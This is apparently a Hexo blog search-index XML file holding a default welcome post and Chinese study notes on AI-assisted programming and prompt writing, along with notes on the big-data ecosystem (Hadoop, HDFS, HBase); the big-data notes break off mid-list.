<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo初始指南</title>
    <url>/project/2024/07/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a class="header-anchor" href="#Quick-Start">¶</a>Quick Start</h2>
<h3 id="Create-a-new-post"><a class="header-anchor" href="#Create-a-new-post">¶</a>Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;hello world!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Run-server"><a class="header-anchor" href="#Run-server">¶</a>Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a class="header-anchor" href="#Generate-static-files">¶</a>Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a class="header-anchor" href="#Deploy-to-remote-sites">¶</a>Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>notes</category>
      </categories>
  </entry>
  <entry>
    <title>【AI_indoor】AI编程开发</title>
    <url>/project/2024/07/19/CS_Notes/AI/%E3%80%90AI_indoor%E3%80%91AI%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>黑马的知识星球的第一次直播。。。睡前一看，播了四个多小时。。。逆天，不过放在旁边听了两个多小时，还是挺多干货的，故今日开始回放记录</p>
<p><a href="https://blog.csdn.net/Miracle_ps/article/details/114791335">Hexo 添加图片——不用插件，超简单_hexo添加图片-CSDN博客</a></p>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/fIZ6YhyrfWCZ81?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h2 id="引入"><a class="header-anchor" href="#引入">¶</a>引入</h2>
<h3 id="一些知名的AI工具"><a class="header-anchor" href="#一些知名的AI工具">¶</a>一些知名的AI工具</h3>
<ul>
<li>ChatGPT</li>
<li>Suno</li>
<li>Copilot</li>
<li>通义千问</li>
<li>Midjourney</li>
<li>Stable Diffusion</li>
<li>文心一言</li>
<li>……</li>
</ul>
<h2 id="认识AI"><a class="header-anchor" href="#认识AI">¶</a>认识AI</h2>
<h3 id="大语言模型"><a class="header-anchor" href="#大语言模型">¶</a>大语言模型</h3>
<ul>
<li>自然语言处理（Natural Language Processing, NLP）是深度学习的一个分支领域，专注于处理和理解人类语言。
<ul>
<li>大语言模型（Large Language Models，LLM ）是NLP领域最突出的一项技术方案，它通过大规模的预训练来学习人类语言，具备处理和生成人类语言文本的能力。LLM有很多种实现，例如OpenAI的GPT4o模型。</li>
</ul>
</li>
<li>常用大模型</li>
</ul>
<table>
<thead>
<tr>
<th><strong>大模型</strong></th>
<th><strong>对话产品</strong></th>
<th><strong>公司</strong></th>
<th><strong>地址</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>GPT-3.5、GPT-4o</td>
<td>ChatGPT</td>
<td>OpenAI</td>
<td><a href="https://chatgpt.com/">https://chatgpt.com/</a></td>
</tr>
<tr>
<td>Gemini-1.5 Pro</td>
<td>Gemini</td>
<td>Google</td>
<td><a href="https://gemini.google.com/">https://gemini.google.com/</a></td>
</tr>
<tr>
<td>Claude 3.5</td>
<td>Claude AI</td>
<td>Anthropic</td>
<td><a href="https://claude.ai/chats">https://claude.ai/chats</a></td>
</tr>
<tr>
<td>文心大模型3.5</td>
<td>文心一言</td>
<td>百度</td>
<td><a href="https://yiyan.baidu.com/">https://yiyan.baidu.com/</a></td>
</tr>
<tr>
<td>星火3.5</td>
<td>讯飞星火</td>
<td>科大讯飞</td>
<td><a href="https://xinghuo.xfyun.cn/desk">https://xinghuo.xfyun.cn/desk</a></td>
</tr>
<tr>
<td>Qwen-Max</td>
<td>通义千问</td>
<td>阿里巴巴</td>
<td><a href="https://tongyi.aliyun.com/qianwen/">https://tongyi.aliyun.com/qianwen/</a></td>
</tr>
<tr>
<td>Moonshoot</td>
<td>Kimi</td>
<td>月之暗面</td>
<td><a href="https://kimi.moonshot.cn/">https://kimi.moonshot.cn/</a></td>
</tr>
<tr>
<td>Yi-Large</td>
<td>零一万物</td>
<td>零一万物</td>
<td><a href="https://platform.lingyiwanwu.com/">https://platform.lingyiwanwu.com/</a></td>
</tr>
</tbody>
</table>
<h3 id="GPT原理"><a class="header-anchor" href="#GPT原理">¶</a>GPT原理</h3>
<ul>
<li>Generative Pre-trained Transformer
<ul>
<li><code>Generative</code>   生成式：根据上下文预测之后应该出现哪个文本，从而形成连续的文本输出</li>
<li><code>Pre-trained</code>  预训练：通过大规模的文本数据进行预训练，让大模型可以理解人类语言的语法、词性。</li>
<li><code>Transformer</code>   Transformer：深度学习的一种神经网络模型。多数AIGC模型都依赖于此。</li>
</ul>
</li>
<li>machine translation   机器翻译</li>
<li>voice-to-text   声音-文字转写</li>
<li>text-to-image    文本生成</li>
<li>推理预测     对于不合理的结构→可能出现幻觉</li>
</ul>
<h3 id="文本向量化"><a class="header-anchor" href="#文本向量化">¶</a>文本向量化</h3>
<ol>
<li>将文本转成一组浮点数，放入一个数组，作为多维空间坐标</li>
<li>通过训练调整向量坐标，使其在不同方向具备含义(GPT3采用12288维空间)</li>
</ol>
<h4 id="向量的相似度"><a class="header-anchor" href="#向量的相似度">¶</a>向量的相似度</h4>
<ul>
<li>
<p>向量的远近</p>
</li>
<li>
<p><strong><u>把词语转换成向量，放到向量空间中。通过向量之间的关系和相似度，来理解词语之间的关系</u></strong></p>
<ul>
<li>例如：“美丽”≈“漂亮”     “美丽”=-“丑陋”</li>
</ul>
</li>
<li>
<p>二维/三维都有</p>
</li>
<li>
<p>视频中的例子：</p>
<ul>
<li><code>E(queen)-E(king) ≈ E(woman)-E(man)</code>  发现这两组词只有性别上的差别</li>
<li><code>E(queen) ≈ E(king) + E(woman)-E(man)</code></li>
<li><code>E(niece)-E(nephew) ≈ E(woman)-E(man)</code></li>
<li><code>E(father)-E(mother) ≈ E(woman)-E(man)</code></li>
<li>E(汉堡) + E(美国) - E(中国) = E(肉夹馍)</li>
</ul>
</li>
</ul>
<h4 id="注意力机制"><a class="header-anchor" href="#注意力机制">¶</a>注意力机制</h4>
<ul>
<li>来源是谷歌的一篇论文</li>
<li>基于上下文，根据其中词语的坐标对向量进行修改，来计算出最终推理到的结果</li>
<li>给的上下文越多，关键词越多，就能进行越精确的调整</li>
<li>GPT有一万多维，计算量十分庞大。所以搜索不会是无穷无尽的，只会限定在<code>上下文(Context)</code>这个范围中</li>
</ul>
<h3 id="GPT的应用"><a class="header-anchor" href="#GPT的应用">¶</a>GPT的应用</h3>
<ul>
<li>
<p>因为记忆力短，所以无法完成复杂任务</p>
<ul>
<li>需要人对任务进行拆解，由AI完成其中的小部分，从而大大提升效率</li>
</ul>
</li>
<li>
<p>第一阶段：<code>AI Embedded</code>   AI嵌入    人类作为主导，任务比例高；由AI完成其中部分</p>
</li>
<li>
<p>第二阶段：<code>AI Copilot</code>   AI助手     1:1工作量     【目前是处于这个阶段】</p>
</li>
<li>
<p>第三阶段：<code>AI Agent</code>     AI智能体     人类来下达命令，AI来拆解任务，把任务块交给其他<code>Agent</code>来完成</p>
</li>
</ul>
<h2 id="AI编程"><a class="header-anchor" href="#AI编程">¶</a>AI编程</h2>
<h4 id="AI编程顾问"><a class="header-anchor" href="#AI编程顾问">¶</a>AI编程顾问</h4>
<ul>
<li>需求分析
<ul>
<li>ChatGPT</li>
<li>Coze/扣子</li>
<li>举例：我要开发一个小程序，帮助用户生成简单的小学算术题，还可以拍照批改用户的作业，记录试卷结果。
<ul>
<li>这样问的不够专业，得到的答案也不够符合需求</li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>产品设计</li>
<li>编码实现</li>
<li>测试与调试</li>
<li>部署与维护</li>
</ul>
<h4 id="需求分析"><a class="header-anchor" href="#需求分析">¶</a>需求分析</h4>
<h5 id="Prompt"><a class="header-anchor" href="#Prompt">¶</a>Prompt</h5>
<ul>
<li>提示词，即发给大模型的指令。是AI时代的编程语言</li>
</ul>
<h5 id="提示词的典型构成"><a class="header-anchor" href="#提示词的典型构成">¶</a>提示词的典型构成</h5>
<ul>
<li><strong>角色</strong>：给AI定义一个最匹配任务的角色</li>
<li><strong>提示</strong>：对任务进行描述</li>
<li><strong>上下文</strong>：给出与任务相关的其他背景信息</li>
<li><strong>例子</strong>：必要时给出举例，对输出的正确性有很大帮助</li>
<li><strong>输入</strong>：任务的输入信息</li>
<li><strong>输出</strong>：输出的有效格式，比如（JSON、XML）</li>
<li><strong>注意</strong>：
<ul>
<li>大模型对于Prompt开头和结尾的内容更敏感</li>
<li>一次写出完美的提示词不太现实，必须不断调试</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Prompt示例</span><br><span class="line"># 角色</span><br><span class="line">你是一名旅游策划师</span><br><span class="line"># 技能</span><br><span class="line">您能够根据以下内容指定旅行计划</span><br><span class="line">- 出发地和目的地</span><br><span class="line">- 人数</span><br><span class="line">-  行程安排（如果没有就根据热门景点推荐合理行程）</span><br><span class="line">- 交通方式</span><br><span class="line">- 旅行时间</span><br><span class="line">以上信息可以与用户交互来获取</span><br><span class="line"># 输出</span><br><span class="line">将旅行计划以表格的形式输出，方便阅读，表格包含下列内容：</span><br><span class="line">- 日期</span><br><span class="line">- 行程安排</span><br><span class="line">- 交通方式</span><br><span class="line">- 住宿安排</span><br></pre></td></tr></table></figure>
<ul>
<li>斯国一啊</li>
<li>优质提示词：<a href="https://github.com/ai-boost/awesome-prompts">https://github.com/ai-boost/awesome-prompts</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 还有一个提示词示例，看起来挺完善的</span><br><span class="line"># 角色</span><br><span class="line">你是一位经验丰富的产品经理，可以从产品设计、需求分析、功能设计、交互设计、业务建模、产品架构设计等方面为用户提供专业的产品建议和指导</span><br><span class="line"></span><br><span class="line">## 技能</span><br><span class="line">### 技能1：需求分析</span><br><span class="line">- 收集和分析用户需求，包括功能需求、性能需求、安全需求等。</span><br><span class="line">- 确定需求的优先级和重要性，为产品的开发和迭代提供指导。</span><br><span class="line"></span><br><span class="line">### 技能2：业务维度分析</span><br><span class="line">- 从市场分析、竞争分析、用户分析等维度进行分析，以确定产品的核心价值和定位。</span><br><span class="line">- 输出格式 ：</span><br><span class="line">	- 维度：&lt;业务维度名称&gt;</span><br><span class="line">	- 有利因素：&lt;该维度的有利因素&gt;</span><br><span class="line">	- 不利因素：&lt;该维度的不利因素&gt;</span><br><span class="line">	- 补充建议：&lt;针对不利因素的补充建议&gt;</span><br><span class="line">	</span><br><span class="line">### 技能3：功能设计</span><br><span class="line">- 根据用户需求和产品目标，设计产品的功能架构和模块。</span><br><span class="line">- 根据产品的功能规格说明书，明确功能的具体要求和实现方式。</span><br><span class="line">- 输出：功能架构图（例如层级结构图、模块关系图）。</span><br><span class="line"></span><br><span class="line">### 技能4：业务建模</span><br><span class="line">- 理解业务流程和业务规则，建立产品的业务模型和数据模型</span><br><span class="line">- 输出业务数据字段的表格，信息如下：</span><br><span class="line">	- 字段名：&lt;字段名称&gt;</span><br><span class="line">	- 定义：&lt;对字段的定义描述&gt;</span><br><span class="line">	- 示例：&lt;举例说明字段的用法&gt;</span><br><span class="line">	- 限制范围/枚举：&lt;字段的限制范围或可能的取值范围&gt;</span><br><span class="line">	- 是否必须：&lt;说明该字段是否为必须字段&gt;</span><br><span class="line">	</span><br><span class="line">### 技能5：交互设计</span><br><span class="line">- 设计产品的用户界面和交互流程，提供产品的易用性和用户满意度。</span><br><span class="line">- 输出：界面设计建议和草图</span><br><span class="line"></span><br><span class="line">## Workflow</span><br><span class="line">1. **确认需求：**通过需求分析确定功能模块和业务维度</span><br><span class="line">2. **业务维度分析：**我从多个维度分析需求文档，并提供补充建议</span><br><span class="line">3. **功能架构图：**我将输出功能架构图，并提供多种样式选项</span><br><span class="line">4. **业务数据字段：**我将输出业务数据字段，并提供详细说明</span><br><span class="line">5. **其他图表：**我将生成业务流程图、时序图和类图</span><br><span class="line"></span><br><span class="line">## 限制</span><br><span class="line">- 只处理与需求文档相关的内容</span><br><span class="line">- 确保输出内容准确、逻辑严谨、格式规范</span><br><span class="line">- 对于不明确或确缺失的信息，将向您询问或提出建议</span><br></pre></td></tr></table></figure>
<h5 id="Coze"><a class="header-anchor" href="#Coze">¶</a>Coze</h5>
<p>Coze中的机器人，有人设与回复逻辑，说明Prompt结构已经提前设计好，直接开始对话即可</p>
<h4 id="设计阶段"><a class="header-anchor" href="#设计阶段">¶</a>设计阶段</h4>
<ul>
<li>设计产品原型，UI</li>
<li>可用模型：
<ul>
<li>Galileo AI</li>
<li>v0</li>
<li>莫高设计</li>
</ul>
</li>
</ul>
<h5 id="Galileo-AI"><a class="header-anchor" href="#Galileo-AI">¶</a>Galileo AI</h5>
<ul>
<li>界面设计建议和草图
<ul>
<li>页面设计建议
<ol>
<li>主界面：包含题目生成入口、拍照批改入口、错题记录查看入口</li>
<li>题目生成界面：用户可以选择年级、题型和题目数量，然后点击生成按钮</li>
<li>拍照批改界面：用户上传照片，系统自动批改并显示结果</li>
<li>错题记录查看界面：显示用户的错题记录，用户可以查看详细信息并标记复习状态</li>
</ol>
</li>
<li>草图‘</li>
</ul>
</li>
<li>提交以上信息后，AI会在线生成效果图，期间可以根据个人需求进行调整。完成后保存效果图，放到v0中使用</li>
</ul>
<h5 id="v0"><a class="header-anchor" href="#v0">¶</a>v0</h5>
<ul>
<li>直接把产品原型的图片上传，v0会自动根据图片生成前端的代码</li>
<li>生成代码后，还可以在效果图中拖拽元素，相应的代码会在线调整</li>
<li>非常适合独立开发者</li>
</ul>
<h4 id="编码实现"><a class="header-anchor" href="#编码实现">¶</a>编码实现</h4>
<ul>
<li>通义灵码</li>
<li>文心快码</li>
<li>Copilot</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 角色</span><br><span class="line">你扮演一位经验丰富的程序员，根据用户的需求帮助用户完成业务功能开发。</span><br><span class="line"></span><br><span class="line"># 需求</span><br><span class="line">我需要开发一个根据年级生成算术题的接口。</span><br><span class="line">- 参数：年级，可以是1或2，分别代表一年级或二年级</span><br><span class="line">- 返回值：100道算术题</span><br><span class="line"></span><br><span class="line">一年级算术题包含3种类型：</span><br><span class="line">- 100以内的加法</span><br><span class="line">- 100以内的减法</span><br><span class="line">- 100以内3个数字的加减混合运算</span><br><span class="line"></span><br><span class="line">二年级算术题包含类型：</span><br><span class="line">- 表内乘法、除法</span><br><span class="line">- 加减乘除混合运算，运算数字为3个数，加减运算数字不超过100，乘除必须是表内乘除法，除法必须是整除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>展示了一个IDEA里面的插件：<code>Baidu Comate</code>，还有阿里的通义千问，在<code>Plugins</code>里面搜索下载</li>
<li>通过演示的小学口算项目，可以发现AI生成的代码可以辅助完成基础框架，但是细节部分仍需要人工修改bug</li>
</ul>
<h5 id="AI代码助手"><a class="header-anchor" href="#AI代码助手">¶</a>AI代码助手</h5>
<ul>
<li>
<h5 id="Baidu-Comate-插件"><a class="header-anchor" href="#Baidu-Comate-插件">¶</a>Baidu Comate 插件</h5>
<ul>
<li>打开插件界面，有<code>/指令</code> <code>@插件</code> <code>#知识</code>  三个选项</li>
<li>举例：<code>知识→API→天气API</code> 选中，然后输入：<code>#天气查询   帮我生成一个查询天气的工具类</code>   即可基于百度的知识库生成代码</li>
<li>也可以查看腾讯云的API中心：<code>https://cloud.tencent.com/document/api/1004/30616</code>  这个是数学作业批改-速算题目批改接口</li>
<li>发送整个文档给Baidu Comate</li>
<li>Prompt：<code>https://cloud.tencent.com/document/api/1004/30616</code> ，请参考链接中的文档，分析一下这个接口的请求地址、请求参数、返回值格式等信息</li>
</ul>
</li>
</ul>
<h4 id="测试与调试"><a class="header-anchor" href="#测试与调试">¶</a>测试与调试</h4>
<ul>
<li>通义灵码</li>
<li>文心快码</li>
<li>Copilot</li>
</ul>
<h4 id="部署与维护"><a class="header-anchor" href="#部署与维护">¶</a>部署与维护</h4>
<ul>
<li>AI生成部署脚本</li>
<li>运维智能体</li>
</ul>
<h4 id="AI应用开发"><a class="header-anchor" href="#AI应用开发">¶</a>AI应用开发</h4>
<ul>
<li>文本分析
<ul>
<li>数据提取和格式化、坐席质检、舆情分析、文本摘要、知识库</li>
<li>推荐的工具：Coze内搜索相关插件、360AI浏览器</li>
</ul>
</li>
<li>多模态
<ul>
<li>Stable Diffusion、文生图、图生图、图像识别、视频生成、语音识别合成、数字人等</li>
<li></li>
</ul>
</li>
<li>机器人应用
<ul>
<li>AI智能客服机器人开发、对话管理、情感分析、个性化回复等</li>
</ul>
</li>
<li>智能体
<ul>
<li>AI金融分析、自动化办公、智慧医疗、工业/制造智能体、运维智能体</li>
</ul>
</li>
<li>自动驾驶
<ul>
<li>计算机视觉处理、车辆自动驾驶</li>
</ul>
</li>
</ul>
<h4 id="AI技术架构"><a class="header-anchor" href="#AI技术架构">¶</a>AI技术架构</h4>
<ul>
<li>纯Prompt问答
<ul>
<li>利用大模型的推理能力，通过Prompt提问来完成业务</li>
</ul>
</li>
<li>Agent + Function Calling
<ul>
<li>AI拆解业务，调用业务端提供的接口实现复杂业务</li>
</ul>
</li>
<li>Fine tuning
<ul>
<li>针对特有业务场景对基础大模型做数据训练和微调，以满足特定场景的需求</li>
</ul>
</li>
<li>RAG (Retrieval Augmented Generation)
<ul>
<li>给大模型外挂一个知识库，让大模型基于知识库内容做推理和回答</li>
</ul>
</li>
<li><strong><u>ai-programing操作指南↓↓↓</u></strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://nbviewer.org/github/brocademaple/bcmp-hexo-inside-storage/blob/main/ai-programing.ipynb&quot; width=&quot;100%&quot; height=&quot;600&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>（hexo中插入ipynb的方式：[向Hexo博客中插入Jupyter Notebook | Coder (<a href="http://lastknightcoder.github.io">lastknightcoder.github.io</a>)](<a href="https://lastknightcoder.github.io/hexo-blog/2020/10/28/%E5%90%91">https://lastknightcoder.github.io/hexo-blog/2020/10/28/向</a> Hexo 博客中插入 Jupyter Notebook/)）引用一下orz</li>
<li>现在讲到哪有点晕……</li>
<li><a href="https://bailian.console.aliyun.com/#/model-market">阿里云百炼-大模型服务平台</a>     国内国外的都有</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义方法，向大模型发送消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_completion</span>(<span class="params">prompt, model = model, temperature = <span class="number">0</span></span>):</span><br><span class="line">    messages = [</span><br><span class="line">        <span class="comment"># 定义角色</span></span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个旅行达人&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;answer&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">        model=model,</span><br><span class="line">        messages=messages,</span><br><span class="line">        temperature=temperature, <span class="comment"># 结果的随机性</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br></pre></td></tr></table></figure>
<h5 id="Prompt问答"><a class="header-anchor" href="#Prompt问答">¶</a>Prompt问答</h5>
<ol>
<li>用户提出问题，提交给应用程序</li>
<li>应用程序发送Prompt给基础大模型</li>
<li>大模型返回响应给应用程序</li>
<li>程序返回响应给用户</li>
</ol>
<ul>
<li>特征：利用大模型推理能力完成应用端无法实现或难以实现的功能</li>
<li>应用场景：
<ul>
<li>文本摘要分析</li>
<li>舆情分析</li>
<li>坐席检查</li>
</ul>
</li>
</ul>
<h5 id="Function-Calling"><a class="header-anchor" href="#Function-Calling">¶</a>Function Calling</h5>
<ol>
<li>
<p>用户提出问题，提交给应用程序</p>
</li>
<li>
<p>应用程序发送Prompt和function定义给基础大模型</p>
<ol>
<li>大模型Agent进行任务分解</li>
<li>大模型调用程序API</li>
</ol>
</li>
<li>
<p>1 程序拼接函数结果，再次发送给Prompt给大模型</p>
</li>
<li>
<p>2 大模型生成回答</p>
</li>
</ol>
<p>（中间可能经过多轮这样的来回）</p>
<ol start="4">
<li>大模型返回响应给程序</li>
<li>程序返回响应给用户</li>
</ol>
<ul>
<li>
<p>特征：</p>
<ul>
<li>将应用端业务能力与AI大模型推理能力结合，简化复杂业务功能开发</li>
<li>利用应用端能力将AI与外部世界连接起来，弥补AI模型缺陷：
<ul>
<li>大模型不是无所不知</li>
<li>大模型知识往往比较落后</li>
<li>大模型逻辑是统计规律，不是真逻辑，存在幻觉</li>
</ul>
</li>
</ul>
</li>
<li>
<p>应用场景：</p>
<ul>
<li>智能体（旅行指南、日程安排等）</li>
<li>数据提取</li>
<li>数据聚合分析</li>
</ul>
</li>
<li>
<p>这一段结合.ipynb文件里面的代码讲的。。。所以回头会再细看一下</p>
</li>
<li></li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 角色</span><br><span class="line">你扮演一位经验丰富的程序员，根据用户的需求帮助用户完成业务功能开发。</span><br><span class="line"></span><br><span class="line"># 需求</span><br><span class="line">我需要开发一个根据年级生成算术题的接口。</span><br><span class="line">参数：年级，可以是一年级或二年级</span><br><span class="line">返回值：100道算术题</span><br><span class="line"></span><br><span class="line">一年级算术题包含3种类型：</span><br><span class="line">- 100以内的加法</span><br><span class="line">- 100以内的减法</span><br><span class="line">- 100以内3个数字的加减混合运算</span><br><span class="line"></span><br><span class="line">二年级算术题包含类型：</span><br><span class="line">- 表内乘法、除法</span><br><span class="line">- 加减乘除混合运算，运算数字为3个数，加减运算数字不超过100，乘除必须是表内乘除法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>感觉这个需求不错，我家确实有小孩需要这个</p>
<p>或许可以作为这个博客的学习项目^ ^?</p>
</div>]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【大数据】直播记录</title>
    <url>/project/2024/07/26/CS_Notes/BidData/%E3%80%90%E5%A4%A7%E6%95%B0%E6%8D%AE%E3%80%91%E7%9B%B4%E6%92%AD%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<h2 id="大数据行业发展，未来前景"><a class="header-anchor" href="#大数据行业发展，未来前景">¶</a>大数据行业发展，未来前景</h2>
<h3 id="大数据的诞生"><a class="header-anchor" href="#大数据的诞生">¶</a>大数据的诞生</h3>
<ul>
<li>
<p>大数据的诞生和信息化以及互联网的发展密切相关</p>
</li>
<li>
<p>上世纪70年代→逐步出现了基于TCP/IP协议的小规模的计算机互联互通，多为军事、科研用途</p>
</li>
<li>
<p>上世纪90年代→全球互联的互联网出现，个人企业均可参与，真正逐步实现全球互联</p>
</li>
<li>
<p>2000年后，互联网上的商业行为剧增。在互联网参与者众多的前提下，商业公司、科研单位等，所能获得的数据量剧增</p>
</li>
<li>
<p>剧增的数据量和羸弱的单机性能→让许多科技公司开始尝试以<strong>数量</strong>来解决问题</p>
</li>
<li>
<p>→<strong>分布式处理技术</strong>诞生</p>
</li>
</ul>
<h3 id="分布式处理技术"><a class="header-anchor" href="#分布式处理技术">¶</a>分布式处理技术</h3>
<ul>
<li>在<strong>数据量巨大</strong>的基础下，以服务器的<strong>数量</strong>来解决大规模数据处理问题</li>
</ul>
<h4 id="分布式处理技术的逐步演化"><a class="header-anchor" href="#分布式处理技术的逐步演化">¶</a>分布式处理技术的逐步演化</h4>
<ul>
<li>
<p>大规模服务器集群下的<strong>大规模数据存储【存】</strong></p>
</li>
<li>
<p>大规模服务器集群下的<strong>大规模数据计算【用】</strong></p>
</li>
<li>
<p>大规模服务器集群下的<strong>大规模数据传输技术【传】</strong></p>
</li>
<li>
<p>08年前分布式技术基本上还处于大企业内部专用且不够成熟</p>
</li>
<li>
<p>08年<strong>Apache Hadoop</strong>开源，广大企业拥有了成熟的、 开源的分布式数据处理解决<strong>方案</strong></p>
</li>
</ul>
<h4 id="大数据的诞生-v2"><a class="header-anchor" href="#大数据的诞生-v2">¶</a>大数据的诞生</h4>
<ul>
<li><strong>Apache Hadoop</strong>是一款开源的分布式处理技术栈，提供了：
<ul>
<li>基于Hadoop HDFS的：分布式数据存储技术</li>
<li>基于Hadoop MapReduce的：分布式数据计算技术</li>
<li>基于Hadoop YARN的：分布式资源调度技术</li>
</ul>
</li>
</ul>
<h4 id="什么是大数据"><a class="header-anchor" href="#什么是大数据">¶</a>什么是大数据</h4>
<ul>
<li>大数据的出现，本质上是为了解决海量数据的处理难题</li>
<li>大数据就是→
<ul>
<li><u><strong>使用分布式技术完成海量数据的处理，得到数据背后蕴含的价值【狭义的（技术思维的）】</strong></u></li>
<li><u><strong>广义的↓</strong></u></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>海量的数据</th>
<th>数字时代人人联网，日常活动产生的数据记录是海量的，背后蕴含的价值也是巨大的</th>
</tr>
</thead>
<tbody>
<tr>
<td>基础设施</td>
<td>大数据在技术上，是数字化时代的基础设施。数字化时代的发展离不开大数据技术的支持</td>
</tr>
<tr>
<td>生活</td>
<td>警务、政务、工业、电商、金融、能源、物流、通讯、科研、教育等。大数据已经渗入生活方方面面</td>
</tr>
</tbody>
</table>
<ul>
<li>狭义上：大数据是一类<strong>技术栈</strong>，是一种用来处理海量数据的<strong>软件技术体系</strong></li>
<li>广义上：大数据是数字化时代、信息化时代的<strong>基础（技术）支撑</strong>，以数据<strong>为生活赋能</strong></li>
<li>学习阶段学习的是狭义的大数据技术栈</li>
<li>工作时广义上为生活赋能</li>
</ul>
<h4 id="大数据软件生态"><a class="header-anchor" href="#大数据软件生态">¶</a>大数据软件生态</h4>
<ul>
<li>分为三大核心工作体系
<ul>
<li><strong>数据存储</strong></li>
<li><strong>数据计算</strong></li>
<li><strong>数据传输</strong></li>
</ul>
</li>
</ul>
<h4 id="数据存储"><a class="header-anchor" href="#数据存储">¶</a>数据存储</h4>
<h5 id="SQL"><a class="header-anchor" href="#SQL">¶</a>SQL</h5>
<ul>
<li>
<p>SQL (Structured Query Language)</p>
<ul>
<li>结构化查询语言，是所有关系型数据库的规范</li>
<li>关系型数据库
<ul>
<li>mysql</li>
<li>oracle</li>
<li>sqlserver</li>
<li>…</li>
</ul>
</li>
</ul>
</li>
<li>
<p>NoSQL：不仅仅是SQL</p>
<ul>
<li>SQL主要强调以<strong>二维的表格</strong>存储数据</li>
<li>NoSQL主要强调以<strong>键值对</strong>形式（KV）存储数据
<ul>
<li>java→map集合    python→dict字典</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="大数据软件生态→数据存储"><a class="header-anchor" href="#大数据软件生态→数据存储">¶</a>大数据软件生态→数据存储</h5>
<ul>
<li>
<p>Apache Hadoop -HDFS</p>
<ul>
<li>Apache Hadoop框架内的组件HDFS是大数据体系中使用最为广泛的分布式存储结束</li>
</ul>
</li>
<li>
<p>Apache HBase</p>
<ul>
<li>Apache HBase是大数据体系内使用非常广泛的NoSQL KV型数据库技术</li>
<li>HBase是基于HDFS之上构建的</li>
</ul>
</li>
<li>
<p>Apache KUDU</p>
<ul>
<li>Apache Kudu同样为大数据体系中使用较多的分布式存储引擎</li>
</ul>
</li>
<li>
<p>云平台存储组件</p>
<ul>
<li>除此外，各大云平台厂商也有相应的大数据存储组件</li>
<li>如：阿里云的OSS、UCloud的US3、AWS的S3、金山云的KS3等等</li>
</ul>
</li>
</ul>
<h4 id="数据计算"><a class="header-anchor" href="#数据计算">¶</a>数据计算</h4>
<ul>
<li>Apache Hadoop -MapReduce
<ul>
<li>Apache Hadoop的MapReduce组件是最早一代的大数据分布式计算引擎对大数据的发展做出了卓越贡献</li>
<li>Java语言写的</li>
</ul>
</li>
<li>Apache Hive
<ul>
